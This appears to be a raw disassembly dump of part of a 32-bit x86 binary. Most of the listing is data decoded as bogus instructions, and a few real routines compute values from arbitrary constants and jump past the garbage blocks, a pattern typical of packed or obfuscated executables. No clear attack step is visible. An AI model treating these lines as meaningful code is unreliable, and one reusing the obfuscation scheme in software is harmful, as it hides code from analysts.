  40c9e1:	imul   edx,DWORD PTR [ebx],0xbb69f5da
  40c9e7:	xchg   esi,eax
  40c9e8:	add    eax,0x293a9787
  40c9ed:	test   BYTE PTR [esi-0x10d9d10f],ah
  40c9f3:	fistp  QWORD PTR [edx]
  40c9f5:	jns    0x40c997
  40c9f7:	addr16 cmp bh,al
  40c9fa:	jae    0x40ca23
  40c9fc:	cld    
  40c9fd:	mov    esi,0xd9b2701
  40ca02:	add    DWORD PTR [esi],edi
  40ca04:	fild   WORD PTR [ebp-0x31]
  40ca07:	loope  0x40ca1c
  40ca09:	fucom  st(7)
  40ca0b:	xchg   ecx,eax
  40ca0c:	call   0xf6fa:0x8a33f697
  40ca13:	or     BYTE PTR [esi],ah
  40ca15:	push   ebp
  40ca16:	cmp    BYTE PTR [esi],dh
  40ca18:	xchg   esp,eax
  40ca19:	pop    edi
  40ca1a:	fsub   DWORD PTR [ecx-0x14]
  40ca1d:	or     ecx,edi
  40ca1f:	and    BYTE PTR [ebx+0x220df3de],0xd1
  40ca26:	jecxz  0x40c9f7
  40ca28:	fwait
  40ca29:	cmp    DWORD PTR [eax],0xad153f77
  40ca2f:	loopne 0x40ca7c
  40ca31:	xchg   ebx,eax
  40ca32:	ror    dh,1
  40ca34:	xchg   DWORD PTR [ecx+0x1d],esp
  40ca37:	xchg   edi,eax
  40ca38:	xchg   bl,dh
  40ca3a:	mov    ah,0x2b
  40ca3c:	ja     0x40c9d6
  40ca3e:	fnstcw WORD PTR [eax+0x7825c650]
  40ca44:	mov    dh,0x52
  40ca46:	push   eax
  40ca47:	mov    ebp,0x391c37e0
  40ca4c:	dec    edx
  40ca4d:	inc    ebp
  40ca4e:	aaa    
  40ca4f:	rol    BYTE PTR [edx],1
  40ca51:	mov    bl,0xe0
  40ca53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca54:	pop    ds
  40ca55:	fs jmp 0xdf9a:0x128aa18c
  40ca5d:	inc    ebx
  40ca5e:	ficomp DWORD PTR [edi-0x1091e476]
  40ca64:	dec    edx
  40ca65:	test   al,0x83
  40ca67:	pop    esi
  40ca68:	cmp    DWORD PTR [ecx+0x40e6c17a],esi
  40ca6e:	neg    BYTE PTR [esi+0x5d]
  40ca71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca72:	fdiv   DWORD PTR [ecx-0x3c0ff123]
  40ca78:	or     BYTE PTR [eax-0x3b],0x36
  40ca7c:	in     al,dx
  40ca7d:	mov    ds,ebx
  40ca7f:	xchg   edx,eax
  40ca80:	xor    DWORD PTR [edi+esi*2-0x7b706ccc],0xfe48ce55
  40ca8b:	(bad)  
  40ca8c:	push   cs
  40ca8d:	xchg   ebx,eax
  40ca8e:	stos   BYTE PTR es:[edi],al
  40ca8f:	push   0xb72787b6
  40ca94:	pop    es
  40ca95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca96:	imul   ebx,DWORD PTR [ebx],0x5d
  40ca99:	xchg   edi,eax
  40ca9a:	ret    0xd720
  40ca9d:	cmc    
  40ca9e:	xor    cl,BYTE PTR [ecx]
  40caa0:	xchg   ecx,eax
  40caa1:	outs   dx,BYTE PTR ds:[esi]
  40caa2:	inc    ebp
  40caa3:	clc    
  40caa4:	jno    0x40cab0
  40caa6:	pop    esi
  40caa7:	setnp  BYTE PTR ds:0x583d985b
  40caae:	enter  0x12d5,0xf2
  40cab2:	lds    ecx,FWORD PTR [edi]
  40cab4:	aam    0x47
  40cab6:	push   ebp
  40cab7:	in     al,0xd5
  40cab9:	in     al,dx
  40caba:	xchg   BYTE PTR [ebp+0x70],dl
  40cabd:	pusha  
  40cabe:	sbb    esp,ebp
  40cac0:	aas    
  40cac1:	pop    ecx
  40cac2:	mov    eax,0x769820ac
  40cac7:	add    al,0x20
  40cac9:	and    BYTE PTR [esi-0x5ae588cf],0xec
  40cad0:	into   
  40cad1:	popa   
  40cad2:	shl    BYTE PTR ds:0x99b22a8b,1
  40cad8:	ss inc bl
  40cadb:	add    BYTE PTR [eax+0x37],dl
  40cade:	dec    ebp
  40cadf:	dec    ebx
  40cae0:	scas   eax,DWORD PTR es:[edi]
  40cae1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cae2:	or     DWORD PTR [eax-0x19a7e854],0xffffffcc
  40cae9:	push   edx
  40caea:	xchg   ebp,eax
  40caeb:	ja     0x40cb08
  40caed:	mov    ds:0xcf7e6aa3,al
  40caf2:	scas   eax,DWORD PTR es:[edi]
  40caf3:	test   BYTE PTR [ecx],bh
  40caf5:	repz cld 
  40caf7:	pop    ebx
  40caf8:	(bad)  
  40caf9:	jl     0x40caed
  40cafb:	dec    esp
  40cafc:	cmp    ah,BYTE PTR [edx+0x2f3b92a9]
  40cb02:	inc    edx
  40cb03:	mov    ds,WORD PTR [ebx]
  40cb05:	cld    
  40cb06:	ja     0x40ca9c
  40cb08:	mov    edx,0xad585458
  40cb0d:	push   esi
  40cb0e:	jp     0x40caa0
  40cb10:	push   ebp
  40cb11:	sti    
  40cb12:	retf   0xef55
  40cb15:	pop    esi
  40cb16:	mov    edx,0xa8139a9e
  40cb1b:	ret    
  40cb1c:	jle    0x40caea
  40cb1e:	repnz gs sahf 
  40cb21:	inc    edi
  40cb22:	dec    ecx
  40cb23:	mov    eax,0x82551432
  40cb28:	sbb    esi,DWORD PTR [edi+0x6d9f8750]
  40cb2e:	pushf  
  40cb2f:	mov    eax,0x7902d984
  40cb34:	dec    ecx
  40cb35:	jg     0x40cafb
  40cb37:	scas   eax,DWORD PTR es:[edi]
  40cb38:	adc    esi,DWORD PTR ss:[edx]
  40cb3b:	fild   QWORD PTR [eax-0x40]
  40cb3e:	out    0x88,eax
  40cb40:	pop    esp
  40cb41:	xlat   BYTE PTR ds:[ebx]
  40cb42:	sbb    eax,0x52318659
  40cb47:	add    ebp,DWORD PTR [ebx+0x7feb981c]
  40cb4d:	mov    eax,ds:0xd4d8f33c
  40cb52:	ffree  st(7)
  40cb54:	push   es
  40cb55:	pop    ebx
  40cb56:	sub    al,0xc
  40cb58:	js     0x40cae6
  40cb5a:	(bad)  [ecx-0xd]
  40cb5d:	sbb    eax,DWORD PTR [edi-0x1b]
  40cb60:	icebp  
  40cb61:	xchg   ecx,eax
  40cb62:	icebp  
  40cb63:	sub    al,0xdf
  40cb65:	sub    esp,DWORD PTR [esi-0x1390c708]
  40cb6b:	jbe    0xb1189ff5
  40cb71:	mov    bh,0x3d
  40cb73:	das    
  40cb74:	stos   DWORD PTR es:[edi],eax
  40cb75:	sub    BYTE PTR [esi-0x1d297672],bl
  40cb7b:	js     0x40cb77
  40cb7d:	push   esi
  40cb7e:	loop   0x40cbb5
  40cb80:	pop    edi
  40cb81:	and    eax,DWORD PTR [ebx]
  40cb83:	sbb    cl,al
  40cb85:	mov    esp,0x670f553d
  40cb8a:	ds or  al,0xd6
  40cb8d:	(bad)  
  40cb8e:	neg    edi
  40cb90:	push   ebx
  40cb91:	js     0x40cbba
  40cb93:	xchg   ecx,eax
  40cb94:	xchg   ax,ax
  40cb96:	ins    BYTE PTR es:[edi],dx
  40cb97:	push   edx
  40cb98:	xor    eax,0x108244ee
  40cb9d:	xor    cl,BYTE PTR [eax]
  40cb9f:	mov    ss,WORD PTR [ebp-0x36]
  40cba2:	pusha  
  40cba3:	push   cs
  40cba4:	mov    ds:0xda3b2df4,eax
  40cba9:	call   0xdaed:0x82217a65
  40cbb0:	(bad)  
  40cbb1:	jb     0x40cbf8
  40cbb3:	or     cl,al
  40cbb5:	dec    ebx
  40cbb6:	sub    al,0xa6
  40cbb8:	(bad)  
  40cbb9:	sar    DWORD PTR [edx+0x47e4b4f],1
  40cbbf:	and    al,0x1
  40cbc1:	jnp    0x40cb56
  40cbc3:	call   FWORD PTR [ecx]
  40cbc5:	jbe    0x40cbdb
  40cbc7:	(bad)  
  40cbc9:	pop    ebx
  40cbca:	pushf  
  40cbcb:	dec    edx
  40cbcc:	call   0x51d8f407
  40cbd1:	enter  0x399a,0x45
  40cbd5:	push   0x3b9b7e6a
  40cbda:	je     0x40cbd7
  40cbdc:	sub    ebp,esi
  40cbde:	(bad)  
  40cbdf:	jae    0x40cc06
  40cbe5:	mov    eax,DWORD PTR [ebp-0x18]
  40cbe8:	mov    edx,DWORD PTR [ebp-0x14]
  40cbeb:	shrd   eax,edx,0x2
  40cbef:	xor    eax,ecx
  40cbf1:	mov    ecx,DWORD PTR [ebp-0x18]
  40cbf4:	shr    edx,0x2
  40cbf7:	mov    edx,DWORD PTR [ebp-0x14]
  40cbfa:	xor    edx,edx
  40cbfc:	shl    ecx,0x1e
  40cbff:	or     eax,edx
  40cc01:	mov    ds:0x422620,eax
  40cc06:	pop    esi
  40cc07:	leave  
  40cc08:	ret    
  40cc09:	push   ebp
  40cc0a:	mov    ebp,esp
  40cc0c:	sub    esp,0x28
  40cc0f:	push   ebx
  40cc10:	push   esi
  40cc11:	push   edi
  40cc12:	mov    DWORD PTR [ebp-0x10],0x67e2
  40cc19:	mov    DWORD PTR [ebp-0x4],0x4726
  40cc20:	mov    DWORD PTR [ebp-0x8],0x580
  40cc27:	mov    DWORD PTR [ebp-0xc],0x5f3e
  40cc2e:	mov    DWORD PTR [ebp-0x28],0x3294
  40cc35:	mov    DWORD PTR [ebp-0x24],0x643
  40cc3c:	mov    DWORD PTR [ebp-0x20],0x2545
  40cc43:	mov    DWORD PTR [ebp-0x1c],0x43ab
  40cc4a:	xor    ebx,ebx
  40cc4c:	inc    ebx
  40cc4d:	mov    DWORD PTR [ebp-0x18],ebx
  40cc50:	mov    DWORD PTR [ebp-0x14],0x76b1
  40cc57:	mov    ecx,DWORD PTR [ebp-0x8]
  40cc5a:	jmp    0x40cf1e
  40cc5f:	sub    edi,ebx
  40cc61:	sti    
  40cc62:	xchg   edi,eax
  40cc63:	sbb    dl,BYTE PTR [edi+0x7d189a1a]
  40cc69:	xor    DWORD PTR [eax+0x70a11fdc],0x1818edb9
  40cc73:	rcl    BYTE PTR [eax+ebx*1],cl
  40cc76:	sbb    BYTE PTR [esi+0x49],ch
  40cc79:	sub    dh,BYTE PTR [eax]
  40cc7b:	pop    ds
  40cc7c:	push   eax
  40cc7d:	int    0x1
  40cc7f:	stos   DWORD PTR es:[edi],eax
  40cc80:	leave  
  40cc81:	pop    edx
  40cc82:	mov    ah,0x95
  40cc84:	inc    eax
  40cc85:	sub    BYTE PTR [ecx+eiz*1],dl
  40cc88:	push   ebx
  40cc89:	push   eax
  40cc8a:	pop    eax
  40cc8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc8c:	sbb    BYTE PTR [esi],cl
  40cc8e:	xor    bh,dh
  40cc90:	add    BYTE PTR [edi+esi*1],dh
  40cc93:	inc    edi
  40cc94:	in     al,0x82
  40cc96:	mov    ah,0x48
  40cc98:	daa    
  40cc99:	in     eax,0xea
  40cc9b:	dec    ebp
  40cc9c:	cli    
  40cc9d:	xchg   ebp,eax
  40cc9e:	pop    esi
  40cc9f:	sahf   
  40cca0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cca1:	jns    0x40cd17
  40cca3:	shl    DWORD PTR [eax-0x7],cl
  40cca6:	loope  0x40cc40
  40cca8:	fwait
  40cca9:	dec    ebp
  40ccaa:	pop    edi
  40ccab:	shl    BYTE PTR [ecx+0x28],0x2a
  40ccaf:	call   0x988290f6
  40ccb4:	fwait
  40ccb5:	(bad)  
  40ccb6:	in     al,0x2f
  40ccb8:	cmp    ebx,DWORD PTR [eax-0x2f3f1fdd]
  40ccbe:	je     0x40cd23
  40ccc0:	arpl   WORD PTR [ebx-0x72e65ec4],cx
  40ccc6:	xchg   cl,al
  40ccc8:	lea    ecx,[edx+ecx*1-0x536c9672]
  40cccf:	cs push ebp
  40ccd1:	aaa    
  40ccd2:	arpl   WORD PTR [eax],dx
  40ccd4:	jno    0x40ccd7
  40ccd6:	aas    
  40ccd7:	cmp    bh,BYTE PTR [esi+0x7f]
  40ccda:	imul   ebx,DWORD PTR [edx-0x8],0xffffff84
  40ccde:	inc    edx
  40ccdf:	sbb    ebp,esp
  40cce1:	mov    ch,0xe7
  40cce3:	in     eax,0xaa
  40cce5:	rcl    DWORD PTR [edx-0x6a],0x2b
  40cce9:	add    al,0xe2
  40cceb:	push   ecx
  40ccec:	(bad)  
  40ccee:	arpl   WORD PTR [esi-0x2b],sp
  40ccf1:	cmp    eax,0xf4d541d6
  40ccf6:	bound  edx,QWORD PTR [ebx]
  40ccf8:	mov    ah,BYTE PTR [eax]
  40ccfa:	pop    edi
  40ccfb:	mov    ds,edi
  40ccfd:	mov    DWORD PTR [eax-0x8430ff8],ebx
  40cd03:	jmp    0x40cd0b
  40cd05:	mov    DWORD PTR [ecx-0x70],ebp
  40cd08:	push   cs
  40cd09:	repz mov ss,WORD PTR [edi+eax*2+0x31]
  40cd0e:	or     eax,0xf31d5010
  40cd13:	sbb    esp,edi
  40cd15:	sub    DWORD PTR [eax+0x2af17dd3],ecx
  40cd1b:	out    dx,eax
  40cd1c:	mov    eax,0xbdab94ef
  40cd21:	and    edi,eax
  40cd23:	mov    ebx,0xaf134951
  40cd28:	in     al,dx
  40cd29:	std    
  40cd2a:	outs   dx,DWORD PTR ds:[esi]
  40cd2b:	pop    ds
  40cd2c:	dec    esp
  40cd2d:	adc    DWORD PTR [edx+eiz*2+0x4db53043],edi
  40cd34:	cwde   
  40cd35:	call   0x21d1b1ed
  40cd3a:	adc    ch,al
  40cd3c:	repz repz test eax,0x8a10b116
  40cd43:	aam    0xca
  40cd45:	imul   esp,DWORD PTR [ebp-0x6cf8e52d],0xfffffffa
  40cd4c:	xchg   ebp,eax
  40cd4d:	sub    ch,BYTE PTR [edx]
  40cd4f:	(bad)  
  40cd50:	xchg   esi,eax
  40cd51:	mul    DWORD PTR [esi]
  40cd53:	fcom   DWORD PTR [edx+0x52]
  40cd56:	cmp    DWORD PTR [esi],ebx
  40cd58:	aaa    
  40cd59:	adc    ecx,DWORD PTR [edx]
  40cd5b:	lea    edx,[eax+eiz*4+0x12]
  40cd5f:	lea    ebx,[eax-0x7b]
  40cd62:	fmul   QWORD PTR [eax]
  40cd64:	jmp    0x40ccff
  40cd66:	mov    edi,0xa858a9c7
  40cd6b:	sub    ch,BYTE PTR [ebx]
  40cd6d:	or     al,0xd7
  40cd6f:	mov    edi,0xaedbb226
  40cd74:	das    
  40cd75:	test   al,0x1a
  40cd77:	jo     0x40cd32
  40cd79:	mov    bh,0xc1
  40cd7b:	or     al,0xb8
  40cd7d:	lock imul DWORD PTR [eax-0x52]
  40cd81:	or     bh,0x80
  40cd84:	jbe    0x40cdd5
  40cd86:	push   es
  40cd87:	add    dh,ch
  40cd89:	jnp    0x40cd37
  40cd8b:	daa    
  40cd8c:	in     eax,0x25
  40cd8e:	lock pushf 
  40cd90:	test   BYTE PTR [esi+0x632d4942],ah
  40cd96:	sub    al,0xb2
  40cd98:	mov    cl,0xe7
  40cd9a:	and    eax,0x74eb64ac
  40cd9f:	(bad)  
  40cda0:	lods   al,BYTE PTR ds:[esi]
  40cda1:	ret    
  40cda2:	inc    ecx
  40cda3:	adc    ch,BYTE PTR [eax]
  40cda5:	or     ebp,esp
  40cda7:	mov    ecx,0x9e1ec0f9
  40cdac:	aad    0xb9
  40cdae:	xchg   ebp,eax
  40cdaf:	jp     0x40cd85
  40cdb1:	in     eax,0xf1
  40cdb3:	les    ebp,FWORD PTR ds:0x98f9
  40cdb8:	inc    edx
  40cdb9:	cmp    DWORD PTR [ebx],ecx
  40cdbb:	and    eax,ecx
  40cdbd:	aad    0x35
  40cdbf:	mov    esi,0x57a74767
  40cdc4:	add    al,0x78
  40cdc6:	fdiv   QWORD PTR [eax+0x410ee165]
  40cdcc:	jle    0x40ce3f
  40cdce:	mov    ebx,0xd26efd4
  40cdd3:	and    eax,0x44a71868
  40cdd8:	jnp    0x40cdc5
  40cdda:	jge    0x40cdb9
  40cddc:	in     al,dx
  40cddd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cdde:	inc    ebp
  40cddf:	pop    ebp
  40cde0:	(bad)  
  40cde2:	xchg   bp,ax
  40cde4:	ret    0xb115
  40cde7:	jp     0x40ce14
  40cde9:	std    
  40cdea:	add    BYTE PTR ds:0xaa9f3db0,bl
  40cdf0:	fld    st(0)
  40cdf2:	outs   dx,BYTE PTR ds:[esi]
  40cdf3:	sbb    DWORD PTR [eax],0x5e418ab8
  40cdf9:	ds (bad) 
  40cdfb:	adc    DWORD PTR [eax-0x44562703],ecx
  40ce01:	shr    DWORD PTR [ebx-0x66114c5d],cl
  40ce07:	sbb    al,0xae
  40ce09:	push   esi
  40ce0a:	mov    ch,0x1b
  40ce0c:	fwait
  40ce0d:	out    dx,eax
  40ce0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce0f:	lods   al,BYTE PTR ds:[esi]
  40ce10:	sbb    DWORD PTR ds:0xcd0e73dc,edi
  40ce16:	xchg   ebp,eax
  40ce17:	xor    al,0x1a
  40ce19:	or     esi,esi
  40ce1b:	mov    ch,0x23
  40ce1d:	call   0x30a2:0x7b16f9b2
  40ce24:	cmc    
  40ce25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ce26:	and    al,0x2b
  40ce28:	imul   DWORD PTR [edi]
  40ce2a:	in     eax,dx
  40ce2b:	leave  
  40ce2c:	mov    BYTE PTR [ebx+0x78147acd],dh
  40ce32:	inc    esi
  40ce33:	mov    edx,0x602fd2f0
  40ce38:	dec    esp
  40ce39:	push   ebx
  40ce3a:	rcl    DWORD PTR [ecx],cl
  40ce3c:	jnp    0x40ce56
  40ce3e:	push   es
  40ce3f:	into   
  40ce40:	mov    eax,0xb1b5e909
  40ce45:	test   al,0x65
  40ce47:	cmc    
  40ce48:	rol    BYTE PTR [ebx-0x4c],cl
  40ce4b:	int3   
  40ce4c:	not    BYTE PTR [ebx+0x58]
  40ce4f:	les    ebx,FWORD PTR [esi-0x7b987e0f]
  40ce55:	add    bl,BYTE PTR [edi-0x46]
  40ce58:	sbb    ah,al
  40ce5a:	dec    ebp
  40ce5b:	or     esp,DWORD PTR [ecx+0x7b92c2b8]
  40ce61:	call   0xd66af0d
  40ce66:	clc    
  40ce67:	int3   
  40ce68:	repz or ebx,DWORD PTR [esi]
  40ce6b:	out    0x85,eax
  40ce6d:	xor    DWORD PTR [edi],ecx
  40ce6f:	lods   eax,DWORD PTR ds:[esi]
  40ce70:	inc    eax
  40ce71:	xor    esi,0x23
  40ce74:	sub    al,0x6
  40ce76:	and    BYTE PTR [ebx-0x39e2ab58],cl
  40ce7c:	and    eax,0x4ec99b43
  40ce81:	jp     0x40ceae
  40ce83:	push   ecx
  40ce84:	mov    al,0x4b
  40ce86:	fs jne 0x40cef3
  40ce89:	test   DWORD PTR [edi+0x167a192d],esi
  40ce8f:	push   edi
  40ce90:	cmp    ch,BYTE PTR [ebp+0x29]
  40ce93:	jbe    0x40cef6
  40ce95:	sbb    dh,BYTE PTR [edi]
  40ce97:	loope  0x40ce90
  40ce99:	cmp    DWORD PTR [ebp-0x64ac5d5c],eax
  40ce9f:	bound  eax,QWORD PTR [esi+0x47c7bf17]
  40cea5:	inc    ebp
  40cea6:	lds    ebx,FWORD PTR [esi-0x52ab2618]
  40ceac:	pop    ebp
  40cead:	or     eax,0x7e7b6f4e
  40ceb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ceb3:	sbb    ah,BYTE PTR [ecx]
  40ceb5:	sbb    edi,DWORD PTR [edx+0x37459dbc]
  40cebb:	mov    bl,0x74
  40cebd:	popa   
  40cebe:	fld    QWORD PTR [esi+0x3567e4b7]
  40cec4:	add    edi,DWORD PTR [ebx+0x6e]
  40cec7:	(bad)  
  40cec8:	(bad)  
  40ceca:	xor    bh,BYTE PTR [ebx-0x7fb987a6]
  40ced0:	mov    esi,0x1c602917
  40ced5:	popa   
  40ced6:	mov    esi,edx
  40ced8:	out    0x9b,al
  40ceda:	or     al,0x52
  40cedc:	adc    eax,0xe38f98a7
  40cee1:	mov    al,ds:0xf75fc9b4
  40cee6:	loope  0x40cee0
  40cee8:	sbb    BYTE PTR [ebp+edx*1-0x68],0x3d
  40ceed:	xor    bl,BYTE PTR es:[ebx+ebp*1+0x51]
  40cef2:	out    0x63,eax
  40cef4:	or     bh,BYTE PTR [ecx+esi*8-0x50]
  40cef8:	fisttp DWORD PTR [edx+edi*2-0x8eed6cd]
  40ceff:	pop    ecx
  40cf00:	mov    ds:0xe6c062e5,al
  40cf05:	ins    BYTE PTR es:[edi],dx
  40cf06:	ror    ah,1
  40cf08:	sub    BYTE PTR [eax],cl
  40cf0a:	cwde   
  40cf0b:	(bad)  
  40cf0c:	call   0xdf52330a
  40cf11:	sub    al,0x93
  40cf14:	xchg   esi,eax
  40cf15:	outs   dx,BYTE PTR ds:[esi]
  40cf16:	and    eax,esp
  40cf18:	loop   0x40cf8b
  40cf1a:	mov    cl,0x83
  40cf1c:	sbb    ch,BYTE PTR [edx+0x2bfc458b]
  40cf22:	enter  0x4d03,0xf4
  40cf26:	add    ecx,DWORD PTR [ebp-0x10]
  40cf29:	imul   ecx,ecx,0x1f80
  40cf2f:	add    ecx,0x727e
  40cf35:	xor    ecx,0x106c92f2
  40cf3b:	mov    DWORD PTR [ebp-0x8],0x113c
  40cf42:	mov    DWORD PTR [ebp-0xc],0x3d61
  40cf49:	mov    DWORD PTR [ebp-0x10],0x16e9
  40cf50:	mov    DWORD PTR [ebp-0x4],0x21aa
  40cf57:	mov    eax,DWORD PTR [ebp-0x10]
  40cf5a:	or     eax,0x3611
  40cf5f:	add    eax,DWORD PTR [ebp-0xc]
  40cf62:	mov    edx,DWORD PTR [ebp-0x8]
  40cf65:	and    eax,edx
  40cf67:	mov    edx,ecx
  40cf69:	sub    edx,eax
  40cf6b:	mov    eax,DWORD PTR [ebp-0x4]
  40cf6e:	mov    esi,DWORD PTR ds:0x422518
  40cf74:	mov    esi,DWORD PTR [esi+0x1cc]
  40cf7a:	add    eax,0x6772
  40cf7f:	or     eax,0x1f24
  40cf84:	sub    eax,0x7046
  40cf89:	xor    eax,0x497a
  40cf8e:	sub    esi,eax
  40cf90:	mov    eax,DWORD PTR [ebp+0x8]
  40cf93:	mov    al,BYTE PTR [edx+eax*1-0x5774]
  40cf9a:	jmp    0x40d25e
  40cf9f:	nop
  40cfa0:	xchg   ebx,eax
  40cfa1:	retf   
  40cfa2:	ja     0x40cf6e
  40cfa4:	das    
  40cfa5:	sub    al,0x6a
  40cfa7:	sbb    DWORD PTR [esi+0x447abcd3],esi
  40cfad:	lea    esi,[eax+0x72]
  40cfb0:	call   0x1512e7cd
  40cfb5:	sbb    BYTE PTR [eax],bl
  40cfb7:	imul   DWORD PTR [edi-0x1111d121]
  40cfbd:	ins    BYTE PTR es:[edi],dx
  40cfbe:	fisttp DWORD PTR [edi]
  40cfc0:	leave  
  40cfc1:	inc    esi
  40cfc2:	adc    ah,BYTE PTR [esi+eiz*2+0x6ff502b7]
  40cfc9:	ret    
  40cfca:	pop    edx
  40cfcb:	xor    ch,bh
  40cfcd:	mov    bl,0xcd
  40cfcf:	add    BYTE PTR [ecx+0x62],dh
  40cfd2:	xchg   BYTE PTR [ebx-0x767c9bba],ch
  40cfd8:	jl     0x40d032
  40cfda:	jo     0x40d044
  40cfdc:	push   esp
  40cfdd:	cld    
  40cfde:	mov    al,0x83
  40cfe0:	sar    BYTE PTR [ebx+0x32],0x9c
  40cfe4:	push   eax
  40cfe5:	jg     0x40cfe8
  40cfe7:	daa    
  40cfe8:	pop    es
  40cfe9:	jge    0x40cfe8
  40cfeb:	rcl    DWORD PTR [ebp+0x5b],1
  40cfee:	sbb    BYTE PTR [edi+0x3b543ee0],bl
  40cff4:	lahf   
  40cff5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cff6:	fwait
  40cff7:	outs   dx,DWORD PTR ds:[esi]
  40cff8:	cmc    
  40cff9:	mov    esi,0x38257feb
  40cffe:	adc    eax,0x904b585
  40d003:	sub    BYTE PTR [edx],ch
  40d005:	sub    dh,BYTE PTR [esi+0x3edb9cd1]
  40d00b:	mov    dl,0xf2
  40d00d:	jecxz  0x40d068
  40d00f:	retf   
  40d010:	std    
  40d011:	cmp    BYTE PTR [ebx],bh
  40d013:	xchg   DWORD PTR [esi+0x5b0da475],edi
  40d019:	repnz imul esi,DWORD PTR [esi-0x38],0x4
  40d01e:	std    
  40d01f:	push   0x44
  40d021:	hlt    
  40d022:	sub    ebp,DWORD PTR [eax+0x71a7cc4c]
  40d028:	jg     0x40d09a
  40d02a:	sub    BYTE PTR [esi+0x53e75a30],ch
  40d030:	imul   BYTE PTR [ecx]
  40d032:	aad    0xd0
  40d034:	jg     0x40cfc7
  40d036:	lods   eax,DWORD PTR ds:[esi]
  40d037:	popa   
  40d038:	sbb    esp,ecx
  40d03a:	clc    
  40d03b:	jmp    0x2c69b4cd
  40d040:	sub    esi,DWORD PTR [edi+ebp*8-0x65]
  40d044:	jno    0x40d059
  40d046:	test   al,0xd8
  40d048:	sub    DWORD PTR [ebx],0x58
  40d04b:	ret    0x9e38
  40d04e:	out    dx,al
  40d04f:	cmc    
  40d050:	mov    cl,BYTE PTR [ebx+0x1f41f3c8]
  40d056:	sub    eax,0x8807ac23
  40d05b:	bound  edi,QWORD PTR [ecx]
  40d05d:	xor    eax,0xd6416070
  40d062:	iret   
  40d063:	xchg   ebx,ecx
  40d065:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d066:	jno    0x40d095
  40d068:	push   ds
  40d069:	push   DWORD PTR ds:0x5af9471e
  40d06f:	dec    ecx
  40d070:	mov    al,0x4d
  40d072:	out    dx,al
  40d073:	mov    edi,0x74b04f45
  40d078:	(bad)  
  40d079:	repz lahf 
  40d07b:	xor    BYTE PTR [ebx+0x53b4c9ec],0x5a
  40d082:	jl     0x40d027
  40d084:	mov    ds:0x91e08a57,al
  40d089:	stc    
  40d08a:	fisubr DWORD PTR [esi+0x2]
  40d08d:	je     0x40d0be
  40d08f:	pop    ecx
  40d090:	add    bp,WORD PTR [edx]
  40d093:	in     al,0x2c
  40d095:	outs   dx,DWORD PTR ds:[esi]
  40d096:	adc    BYTE PTR [eax],al
  40d098:	xchg   al,dl
  40d09a:	mov    cl,0xab
  40d09c:	dec    esi
  40d09d:	(bad)  
  40d09f:	adc    DWORD PTR [edx-0x7eda441a],0xf2da8540
  40d0a9:	pop    ebp
  40d0aa:	pop    esi
  40d0ab:	out    0xc2,eax
  40d0ad:	pop    es
  40d0ae:	add    DWORD PTR [edx+0x73124b3d],ebx
  40d0b4:	pop    ds
  40d0b5:	inc    ecx
  40d0b6:	cdq    
  40d0b7:	leave  
  40d0b8:	push   ebx
  40d0b9:	out    0xae,al
  40d0bb:	add    BYTE PTR [edi],al
  40d0bd:	cmp    eax,0xd5ceb9d0
  40d0c2:	clc    
  40d0c3:	xor    cl,ch
  40d0c5:	inc    esp
  40d0c6:	push   0xddf0e8a0
  40d0cb:	mov    ds:0x4f2fd03c,al
  40d0d1:	pop    cx
  40d0d3:	cld    
  40d0d4:	fnstsw WORD PTR [ebp+0x26145cba]
  40d0da:	clc    
  40d0db:	push   0xa721071b
  40d0e0:	js     0x40d0cb
  40d0e2:	out    0x61,eax
  40d0e4:	je     0x40d072
  40d0e6:	mov    WORD PTR [edx+0x379fb316],ds
  40d0ec:	(bad)  
  40d0ed:	sub    ah,BYTE PTR [ebx]
  40d0ef:	ja     0x40d156
  40d0f1:	or     al,BYTE PTR [esi-0x5e]
  40d0f4:	pop    edi
  40d0f5:	ds push 0x15b4c2ff
  40d0fb:	xor    DWORD PTR [ecx],ebp
  40d0fd:	in     al,dx
  40d0fe:	cmp    eax,0x5bbefcc3
  40d103:	adc    dl,BYTE PTR [edx]
  40d105:	mov    edx,0x30150568
  40d10a:	cmp    ch,BYTE PTR [ecx-0x2e9d2bbb]
  40d110:	and    eax,0x866fb7ac
  40d115:	nop
  40d116:	sbb    edi,DWORD PTR [eax-0x18]
  40d119:	(bad)  
  40d11a:	mov    bl,0x91
  40d11c:	or     BYTE PTR [esi+0xc9ac803],al
  40d122:	fcom   DWORD PTR [eax+0x44]
  40d125:	inc    ebp
  40d126:	jmp    0x20aa:0xb25e2279
  40d12d:	sub    edx,DWORD PTR [edi]
  40d12f:	jg     0x40d129
  40d131:	stc    
  40d132:	jle    0x40d175
  40d134:	push   esp
  40d135:	cld    
  40d136:	push   ecx
  40d137:	mov    BYTE PTR [edx],bh
  40d139:	retf   
  40d13a:	fidiv  DWORD PTR [ebx+0x69692495]
  40d140:	dec    edx
  40d141:	ins    BYTE PTR es:[edi],dx
  40d142:	inc    esi
  40d143:	lock push 0xffffff80
  40d146:	ins    BYTE PTR es:[edi],dx
  40d147:	pop    es
  40d148:	cmp    bh,BYTE PTR [ecx]
  40d14a:	mov    DWORD PTR [edi+0x44],0x414d3b0b
  40d151:	sbb    bh,BYTE PTR [ebp-0xd]
  40d154:	adc    al,0x61
  40d156:	inc    ebx
  40d157:	adc    BYTE PTR [ebx-0x41],cl
  40d15a:	mov    dh,0x4c
  40d15c:	adc    al,cl
  40d15e:	pop    ecx
  40d15f:	push   esp
  40d160:	add    ch,cl
  40d162:	push   0x20d973c1
  40d167:	mov    dl,0xc
  40d169:	(bad)  
  40d16a:	retf   0xb238
  40d16d:	clc    
  40d16e:	jb     0x40d125
  40d170:	mov    ebx,0x47c53e59
  40d175:	std    
  40d176:	retf   0x9f5d
  40d179:	mov    WORD PTR ds:0x3fef7d11,ds
  40d17f:	bound  ecx,QWORD PTR fs:[ebx+0x7d256595]
